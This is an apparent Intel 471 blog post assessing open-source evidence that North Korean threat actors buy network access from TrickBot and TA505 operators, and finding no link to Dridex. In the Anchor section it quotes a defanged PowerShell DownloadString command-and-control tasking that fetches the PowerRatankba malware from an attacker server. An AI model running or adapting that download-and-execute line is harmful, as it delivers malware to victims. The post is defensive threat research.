    "plain_text": "# Partners in crime: North Koreans and elite Russian- speaking cybercriminals\n\n**[intel471.com/blog/partners-in-crime-north-koreans-and-elite-russian-speaking-cybercriminals](https://intel471.com/blog/partners-in-crime-north-koreans-and-elite-russian-speaking-cybercriminals)**\n\nBy Mark Arena, CEO of Intel 471.\n\nThis blog post takes a look at the credibility of claims in public reports of North Korean\n(referred to as DPRK for the rest of this post) links to Russian-speaking cybercriminals. The\npost is based as much as possible on public and open sources from credible parties that can\nbe referenced rather than introducing new or confidential sources of information. We\nexamine TrickBot, TA505 and Dridex, believed to originate from Eastern Europe, and\nattempt to understand potential linkages between these and DPRK threat actors.\n\nFor the purpose of this blog post, we are making the following generally accepted\nassumptions:\n\nLazarus/Lazarus Group is tied to DPRK threat actors.\nTrickBot, TA505 and Dridex are tied to Russian-speaking cybercriminals.\n\nIt is outside the scope of this blog post to explain or justify this attribution.\n\n**Key findings**\n\nDPRK threat actors likely are active in the cybercriminal underground and maintain\ntrusted relationships with top-tier Russian-speaking cybercriminals.\nMalware believed to be only used and probably written by DPRK threat actors was very\nlikely delivered via network accesses held by Russian-speaking cybercriminals\n(TrickBot, TA505).\n\n**Seeking assistance**\n\nOn Aug. 28, 2020, I posted a [tweet asking a number of security researchers for original](https://twitter.com/markarenaau/status/1299322490896830464)\nsource data/information that linked Lazarus to Dridex or TrickBot. My tweet indicated that I\nwas skeptical of alleged links between DPRK threat actors and the actors behind TrickBot,\nTA505 and Dridex.\n\n**TrickBot, TA505 and the cybercriminal underground**\n\nThe “cybercriminal underground,” as we like to call it at Intel 471, is an organized ecosystem\nof products, services and goods consisting of real-life suppliers and consumers who can be\nmapped, tracked, understood and exposed. Participation and entry into the underground at\n\n\n-----\n\nthe bottom tiers is easy. Becoming trusted, verified and achieving a good underground\nreputation takes years of work. We assess the operators and customers of TrickBot and the\nactors that make up TA505 as top-tier cybercriminals.\n\nTrickBot is a private malware-as-a-service (MaaS) offering, run by Russian-speaking\ncybercriminals, that is not openly advertised on any open or invite-only cybercriminal forum\nor marketplace. It is determined by Intel 471 that only top-tier cybercriminals with a proven\nreputation can access the service. Reputation is gained through being involved in buying and\nselling products, services and goods in the cybercriminal underground. Even identifying who\nto talk to about accessing TrickBot would require a significant amount of activity and\nreputation in the underground. Therefore, the ability of DPRK threat actors to communicate\nwith operators or customers of TrickBot would mean they are considered top-tier\ncybercriminals in their own right.\n\nIntel 471 also believes TA505 actors are heavily involved in the cybercriminal underground\nbased on the amount of tooling they have purchased from there. A number of organizations\nincorrectly link threat activity to TA505, so more information on what we consider to be\nTA505 threat activity is available in Annex 1: Defining TA505 at the bottom of this post.\n\n**Attributing threat actors who use a shared MaaS – TrickBot**\n\nWhen examining malware families that are shared MaaS offerings like TrickBot, one must\nunderstand how to identify different users of the shared criminal service. With TrickBot, the\nmalware has a hard-coded parameter in each sample called the gtag. This is thought to be a\ncampaign identifier, useful for tracking the TrickBot operators’ different spreading\nmechanisms.\n\n[Palo Alto’s Unit 42 (Brad Duncan) wrote a blog that was published on May 28, 2020, and](https://twitter.com/malware_traffic)\nincluded the following:\n\n_Every TrickBot binary has an identifier called a gtag. This is found in configuration data_\n_extracted from a TrickBot binary. Gtags can also be found in HTTP traffic during a_\n_TrickBot infection. They indicate the specific campaign or source of infection used for a_\n_TrickBot binary._\n\n_The gtag is a short alphabetic string followed by a number representing a one-up_\n_serialization. Examples follow:_\n\n_mor-series gtag: TrickBot caused by an Emotet infection, for example: TrickBot gtag_\n_[mor84 caused by Emotet on January 27th, 2020.](https://isc.sans.edu/forums/diary/Emotet+epoch+1+infection+with+Trickbot+gtag+mor84/25752/)_\n_ono-series gtag: various TrickBot infections initiated through malicious Microsoft_\n_Office documents like Word documents or Excel spreadsheets, distributed through_\n_English-language emails._\n_red-series gtag: TrickBot distributed as a DLL file instead of an EXE, for example:_\n_[TrickBot gtag red5 documented on March 17th 2020](https://isc.sans.edu/forums/diary/Trickbot+gtag+red5+distributed+as+a+DLL+file/25918/)_\n\n\n-----\n\n**Linking DPRK threat actors to TrickBot – LEXFO s analysis**\n\nOn Feb. 19, 2020, a [report by the French information security consultancy LEXFO titled \"The](https://blog.lexfo.fr/ressources/Lexfo-WhitePaper-The_Lazarus_Constellation.pdf)\nLazarus Constellation - A study on North Korean malware\" was published. A section of the\nreport is titled Clarifying links with TA505 (Emotet, TrickBot & Dridex). While including\nsome unclear and unexplained links between TA505 and Emotet (we’ve never seen TA505\nuse Emotet) as well as TrickBot and Dridex (see Annex 1: Defining TA505), the report claims:\n\nDPRK threat actors have used a piece of ransomware called Hermes, which was sold in\nthe underground \"for as little as $300 in 2017/2018\" and Ryuk ransomware shares\nmost of its code with Hermes.\n_\"Researchers reported that they saw previous Lazarus infections cohabit with Emotet_\n_and TrickBot, which can also be observed during a forensic mission.\"_\n\nIntel 471 was able to verify that Hermes was offered for sale (posted in both Russian and\nEnglish) by the actor CryptoTech on a Russian-language cybercriminal forum in mid-2017.\n\n**Linking DPRK threat actors to TrickBot – PowerBrace**\n\n[On July 11, 2019, NTT Security published a blog post titled \"Targeted TrickBot activity drops](https://web.archive.org/web/20191212212511/https://technical.nttsecurity.com/post/102fnog/targeted-trickbot-activity-drops-powerbrace-backdoor)\n'PowerBrace' backdoor.” While the blog post incorrectly states the May 2019 observed\nactivity is possibly linked to TA505 (see Annex 1: Defining TA505), it does cover an incident\n[where TrickBot was used to deliver the PowerBrace backdoor, which BAE attributes to DPRK](https://norfolkinfosec.com/osint-reporting-on-dprk-and-ta505-overlap/)\nthreat actors.\n\nNTT Security’s blog post unfortunately also doesn’t shed light on the precursor event to the\nspecific TrickBot infection that led to PowerBrace being dropped onto the system or on what\nversion and gtag of the TrickBot infections were dropping PowerBrace.\n\n**Linking DPRK threat actors to TrickBot – Anchor and PowerRatankba**\n\n[On Dec. 10, 2019, SentinelOne researchers published a blog post and report titled \"Anchor](https://labs.sentinelone.com/the-deadly-planeswalker-how-the-trickbot-group-united-high-tech-crimeware-apt/)\nProject | The Deadly Planeswalker: How The TrickBot Group United High-Tech Crimeware &\nAPT.” The report claimed TrickBot actors had \"refactored and repurposed\" TrickBot into an\n_\"attack framework leveraging the project called 'Anchor'\" and that Anchor was being_\n_\"leveraged to actively attack medium-sized retail businesses amongst other corporate_\n_entities using point-of-sale (POS) systems.” Their research also revealed a \"command-and-_\n_control tasking for a compromised machine to download a specific tool linked to the_\n_Lazarus PowerRatankba\" from Anchor. The specific tasking was:_\n\n_DownloadString('hxxps://ecombox[.]store/tbl_add.php?action=cgetpsa')_\n\n[A day later (Dec. 11, 2019), Cybereason published a blog post titled “Dropping Anchor: From](https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware)\na TrickBot infection to the discovery of the Anchor malware” that said (without any\nmentioned links to DPRK threat actors or tooling) that Anchor was focused on targeting PoS\n\n\n-----\n\nsystems. They further described Anchor as being _used very selectively on high-profile_\n_targets\" and appearing to be \"tightly connected to TrickBot.” The infection vector described_\nby Cybereason “starts with a phishing email that contains a malicious link to a file hosted on\n_Google Docs named ‘Annual Bonus Report.doc.’ When the user clicks on the link, the_\n_TrickBot dropper downloads onto the target machine. This differs from previous TrickBot_\n_attacks we have seen, where TrickBot is usually dropped through a Microsoft Office_\n_document or by another malware like Emotet.”_\n\n[NTT Security also published a blog post titled \"TrickBot variant ‘Anchor_DNS’](https://hello.global.ntt/zh-cn/insights/blog/trickbot-variant-communicating-over-dns)\ncommunicating over DNS\" on July 6, 2020. This post covers (without any mentioned links to\nDPRK threat actors or tooling) NTT seeing \"Anchor_DNS\" deployed against the financial\nsector and against \"high impact servers such as AD [Active Directory] controllers.” They\nexplain the infection vector as being \"the typical distribution methods of TrickBot, such as\n_mail-spam and malware droppers.” NTT describes the deployment of selected malware_\ndepending on the target but describes their visibility showing that ransomware and PoS are\n\"prevalent.” They also describe the TrickBot gtags related to this activity as \"tot548, ser501,\n_etc.”_\n\nOf the three posts on Anchor, only one mentioned observing a tool believed to be linked to\nDPRK threat actors. SentinelOne reported seeing a command-and-control tasking (via\nAnchor) to download PowerRatankba to an infected system. PowerRatankba is also\n[mentioned in a blog post published on Jan. 15, 2019, from Flashpoint that covers a December](https://www.flashpoint-intel.com/blog/disclosure-chilean-redbanc-intrusion-lazarus-ties/)\n2018 intrusion into a \"Chilean interbank network Redbanc\" that is said to involve\nPowerRatankba.\n\nPowerRatankba has only been reported to have been used in a small number of\ncompromises, mainly against financial institutions, and SentinelOne claims it was pushed via\nAnchor with a TrickBot infection being a precursor to what SentinelOne reported. According\nto an [open source report on the incident against Redbanc as described in Flashpoint's blog](http://www.trendtic.cl/2019/01/exclusivo-asi-fue-el-intento-de-ciberataque-a-redbanc-en-diciembre/)\npost, an employee of Redbanc was socially engineered to run a file named\nApplicationPDF.exe. Flashpoint’s analysis of this file is that ApplicationPDF.exe is a dropper\nthat “displays a fake job application form while downloading and executing\n_PowerRatankba” and that hxxps://ecombox[.]store/tbl_add.php?action=agetpsb is called._\nThis is the same server and a very similar get request as described by SentinelOne in their\nresearch on Anchor.\n\n[Building upon Flashpoint's analysis, QuoIntelligence published a blog post on Jan. 21, 2019,](https://quointelligence.eu/2019/01/new-evidence-might-link-lazarus-tool-found-in-chile-redbanc-intrusion-to-previous-attacks/)\nstating they believe the targeting of multiple Pakistani bank employees by DPRK actors had\noccurred. In the case they describe, ApplicationPDF.exe (also connected to ecombox[.]store\nand described as PowerRatankba) was also used and their \"analysis revealed the victim\n_being an employee at a financial services provider in Pakistan and knowledgeable in_\n_financial systems and technologies including Point-of-Sales (POS) and Automated Teller_\n_Machine (ATMs).”_\n\n\n-----\n\nProofpoint, in their [post and report titled North Korea Bitten by Bitcoin Bug: Financially](https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new)\nmotivated campaigns reveal new dimension of the Lazarus Group\" and published on Dec. 19,\n2017, describes PowerRatankba as a “PowerShell-based malware variant that closely\n_resembles the original Ratankba implant.” Proofpoint writes that they “believe that_\n_PowerRatankba was likely developed as a replacement in Lazarus Group’s strictly_\n_financially motivated team’s arsenal to fill the hole left by Ratankba’s discovery.”_\n[Proofpoint also links to a blog post from Trendmicro titled \"Ratankba: Delving into Large-](https://www.trendmicro.com/en_us/research/17/b/ratankba-watering-holes-against-enterprises.html)\nscale Watering Holes\" and published on Feb. 27, 2017, which talks about Ratankba being\n_\"tied to malware attacks against banks in Poland, but also in a string of similar incidents_\n_involving financial institutions in different countries.” Trendmicro’s attribution analysis of_\nRatankba:\n\n_Were the attacks carried out by cybercriminal group Lazarus?_\n\n_While there is ambivalence if they were indeed their handiwork, our analysis indicates that_\n_the malware codes and techniques employed resembled those used by Lazarus._\n\n**DPRK threat actors likely linked to TrickBot operators or users**\n\nBased on the above examined links between DPRK threat and TrickBot, we assess it is likely\nthere is a link between the operators or users of TrickBot and DPRK threat actors. TrickBot\ncertainly appears to be a source of compromised accesses that DPRK threat actors can\nleverage. The operators or users of TrickBot seem to be well-versed in identifying interesting\norganizations they’ve compromised for follow-up intrusion activity, be it through Anchor or\ncommon intrusion tools (Metasploit, Cobalt Strike, BloodHound, Empire, etc.), or to pass off\nor sell to other threat actors, i.e., DPRK threat actors.\n\nThe precursor to a TrickBot infection and the version and gtag of a TrickBot sample that\nleads to DPRK tooling needs to be better understood for any future analysis of DPRK links to\nTrickBot. There is not enough original source information available within open sources to\nunderstand if all TrickBot infections could potentially lead to DPRK threat actors or only a\nsubset of TrickBot infections could lead to a DPRK intrusion. Only a subset of TrickBot\ninfections leading to DPRK intrusions could mean that users/customers of TrickBot are\nlinked to DPRK threat actors rather than the operators of the TrickBot MaaS.\n\n**Linking DPRK threat actors to TA505**\n\nOn April 10, 2019, the researcher [Norfolk wrote a blog post titled “OSINT Reporting](https://norfolkinfosec.com/)\nRegarding DPRK and TA505 Overlap.” This blog post quotes a 2019 BAE Systems\n[presentation from Kaspersky’s annual security researcher conference (SAS) that mentions a](https://thesascon.com/)\n\"possible overlap between TA505 intrusions and DPRK intrusions, suggesting a possible\nhand-off between the two groups.”\n\n\n-----\n\n[Norfolk s post included a link to an article from Wired that was posted on April 9, 2019, and](https://www.wired.com/story/atm-hacks-swift-network/)\ntitled “A New Breed of ATM Hackers Gets in Through a Bank’s Network.” Within the Wired\n[article are quotes from BAE Systems Intelligence Analyst Saher Naumaan (one of the](https://twitter.com/saffronsec)\npresenters of the presentation at SAS) with regard to links between Lazarus and TA505:\n\n_In their incident response work with banks, BAE Systems analysts repeatedly noticed that_\n_the victim networks they were studying were infected with both a malware dubbed_\n_GraceWire and known Lazarus malware tools. The researchers also found possible links_\n_between GraceWire and a well-known financially motivated criminal hacking gang called_\n_TA505. Though Naumaan says it is too early to draw definitive conclusions about these_\n_overlaps, it's possible that Lazarus has been contracting with TA505 or other groups to_\n_gain access to financial networks._\n\n_\"There is kind of a central theory that’s being considered that TA505 may be the one to_\n_compromise the network and get the initial access and then sell that access to Lazarus,\"_\n_Naumaan says. \"This would be interesting because in most of these fraud incidents we_\n_didn’t know the intrusion vector—that was one of the biggest unknowns.\"_\n\n[Saher Naumaan also clarified the link between TA505 and Lazarus on Twitter:](https://twitter.com/saffronsec/status/1116323665694478336)\n\n_Also just to clarify, in my talk I said it was just a theory and we can’t verify it, and there are_\n_other theories as well_\n\n[Intel 471’s own analysis is that GraceWire aka FlawedGrace (as mentioned in the](https://blog.intel471.com/2020/05/21/a-brief-history-of-ta505/)\n[aforementioned Wired article) was observed being used by TA505. Proofpoint also linked the](https://www.wired.com/story/atm-hacks-swift-network/)\n[use of GraceWire to TA505 in an early 2019 blog post. Intel 471 is not aware of any threat](https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505)\nactors that have used GraceWire other than TA505.\n\nDespite BAE’s claim of the discovery of compromised financial sector systems having tooling\nbelieved to be only used by TA505 alongside tooling only used by DPRK threat actors, it is\ndifficult to independently conclude a solid link exists between TA505 and DPRK threat actors\nwithout seeing original source data/information. Further examination is required to\nunderstand how many victim networks BAE analysts saw TA505 and DPRK tooling alongside\neach other and in the context in which they were seen together.\n\n[The U.S. Cybersecurity and Infrastructure Security Agency (CISA) recently released an alert](https://us-cert.cisa.gov/ncas/alerts/aa20-239a)\ntitled “FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks on 26 August 2020.” This\nalert specifically mentions that DPRK threat actors may \"be working with or contracting out\n_to criminal hacking groups, like TA505, for initial access development.”_\n\nAlthough we haven’t been able to conclusively link DPRK and TA505 through open sources,\nconversations we’ve had with other members of the security community have left us with the\nopinion that TA505 historically worked on occasion with DPRK threat actors, although that\ndoesn’t seem to have occurred recently.\n\n\n-----\n\n**No information to suggest DPRK threat actors are linked with Dridex**\n\nSee Annex 2: No link found between DPRK threat actors and the actors behind Dridex.\n\n**Final remarks**\n\nOur conclusion is that we deem it likely that threat actors running or having access to\nTrickBot infections are in contact with DPRK threat actors. While it is hard to assess, it looks\nlikely that the network accesses purchased by DPRK threat actors from TrickBot-linked\nactors were from financial institutions. It also appears that DPRK threats actors have\nmultiple other sources of network accesses beyond just TrickBot infections and that two such\nadditional sources are accesses sold in the cybercriminal underground and accesses obtained\nthrough social engineering. The number of increasing network accesses sold by other\ncybercriminals in the underground could enable DPRK threat actors to focus greater efforts\non developing tooling and tactics, techniques and procedures (TTPs) for maintaining\npersistence and operating within compromised networks rather than initial access efforts.\n\n**Annex 1: Defining TA505**\n\nDefining TA505 is a somewhat difficult task because of their decentralized organization.\n[Numerous organizations (Intel 471 included) have their own view on what is and isn’t TA505,](https://blog.intel471.com/2020/05/21/a-brief-history-of-ta505/)\nbut with Proofpoint first coming up with the name, it’s only fair that we use their description\nas a basis for this post. The first TA505 mention we could find from Proofpoint is their blog\npost from Sept. 27, 2017, titled “Threat Actor Profile: TA505, From Dridex to\nGlobeImposter.”\n\n_Proofpoint researchers track a wide range of threat actors involved in both financially_\n_motivated cybercrime and state-sponsored actions. One of the more prolific actors that we_\n_track - referred to as TA505 - is responsible for the largest malicious spam campaigns we_\n_have ever observed, distributing instances of the Dridex banking Trojan, Locky_\n_ransomware, Jaff ransomware, The Trick banking Trojan [Trick = TrickBot], and several_\n_others in very high volumes._\n\n_Because TA505 is such a significant part of the email threat landscape, this blog provides a_\n_retrospective on the shifting malware, payloads, and campaigns associated with this actor._\n_We examine their use of malware such as Jaff, Bart, and Rockloader that appear to be_\n_exclusive to this group as well as more widely distributed malware like Dridex and Pony._\n\n_…_\n\n_The last TA505 campaigns featuring The Trick appeared in mid-September 2017 with_\n_payloads alternating between Locky and The Trick._\n\n\n-----\n\nFrom this, we can ascertain that Proofpoint believes that TA505 uses a number of different\ntools that other cybercriminals also use, but they believe they are the exclusive users of Jaff,\nBart and Rocketloader. From that write-up, Proofpoint believes TA505 uses both Dridex and\nTrickBot, but other actors also use them.\n\nCommon attribution mistakes regarding TA505 that we see are:\n\nClaiming TA505 developed Dridex. TA505 was a customer of Dridex from 2014 to 2017\nand stopped using Dridex in 2018. Sources for this are the French Cybersecurity Agency\n[ANSSI and NCC Group. Evil Corp is the group behind Dridex, a number of whose](https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/)\n[members were publicly indicted in late 2019 by the U.S. Department of Justice.](https://www.justice.gov/opa/pr/russian-national-charged-decade-long-series-hacking-and-bank-fraud-offenses-resulting-tens)\nEquating all Emotet or TrickBot activity to TA505. TA505 never used Emotet and only\nused TrickBot for a short period of time in late 2017.\n\n**Annex 2: No link found between DPRK threat actors and the actors behind**\n**Dridex**\n\n[On Nov. 15, 2017, Jerome Kehrli posted a blog post titled “Deciphering the Bangladesh bank](https://www.niceideas.ch/roller2/badtrash/entry/deciphering-the-bengladesh-bank-heist)\nheist” that included the mention of a \"custom Dridex worm\" with the file name evtdiag.exe\nused in the hack of Bangladesh Bank. Kehrli’s blog post is frequently cited as the source of\n[linkage between Lazarus and Dridex. Two security researchers on Twitter pointed out that](https://twitter.com/r0ny_123/status/1299591242120966147)\n[evtdiag.exe was not Dridex but a Lazarus-linked tool. Kehrli responded to this with](https://twitter.com/JeromeKehrli/status/1299952741851246593)\nconfirmation that the belief was that evtdiag.exe was Dridex at the time but it wasn’t\nconfirmed. As a result, Kehrli said that he would update the article to reflect this information.\n\nBased on Kehrli’s response and no other primary source information or data, no other links\nbetween Dridex and Lazarus were found.\n\n**Annex 3: How to protect your organization from DPRK threat actors given**\n**access through a TrickBot infection**\n\nThe first order of business for any organization is to have good security hygiene, including\nbut not limited to ongoing security monitoring, a detection strategy, and response and\nrecovery. No matter the spreading mechanism for TrickBot, all TrickBot samples use the\nsame command and control server list. By blocking these control servers, TrickBot will not be\nable to call home to the criminal’s servers. Once the criminals behind TrickBot have\nidentified an access of interest, the network defender is racing against the clock. Possible next\nsteps for the criminals are ransomware attacks or providing/selling access to other actors,\ni.e., DPRK threat actors.\n\n\n-----",
